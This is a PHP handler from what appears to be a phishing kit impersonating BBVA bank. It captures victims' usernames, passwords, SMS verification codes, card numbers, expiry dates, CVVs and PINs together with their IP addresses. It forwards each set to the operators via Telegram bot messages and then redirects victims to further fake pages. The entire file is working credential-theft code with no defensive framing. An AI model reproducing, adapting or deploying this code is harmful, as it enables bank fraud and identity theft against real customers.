<?php
require "../main.php";

function post($data){
if(empty(trim($data))){
return "NO_DATA";
}else{
return htmlspecialchars($_POST[$data]);
}
}

$ip = $_SERVER['REMOTE_ADDR'];


function sendBot($url){
$ci = curl_init();
curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ci, CURLOPT_URL, $url);
$res = curl_exec($ci);
curl_close($ci);
return $res;
}


if(isset($_POST['user'])){

$login = post("user");
$password = post("pass");
$telegram_content = urlencode("
[ BBVA LOGIN ] 
-> Login : $login
-> Password : $password
[ $ip ]
");


foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}

}





if(isset($_POST['sms'])){

$sms = post("sms");

$telegram_content = urlencode("
[ BBVA SMS ] 
-> SMS : $sms
[ $ip ]
");

foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}

if(isset($_POST['exit'])){
    die(header("location: exit.php"));
}
header("location: sms.php?error");

}






if(isset($_POST['cc'])){

$cardnumber = post('cc');
$exp = post("exp");
$cvv = post("cvv");
$pin = post("pin");

$telegram_content = urlencode("
[ BBVA CC ] 	
+ Cardnumber : $cardnumber 
+ ExpDate : $exp 
+ CVV : $cvv
+ Pin : $pin
[ $ip ]
");


foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}


header("location: wait.php?next=sms.php");


}

 


?>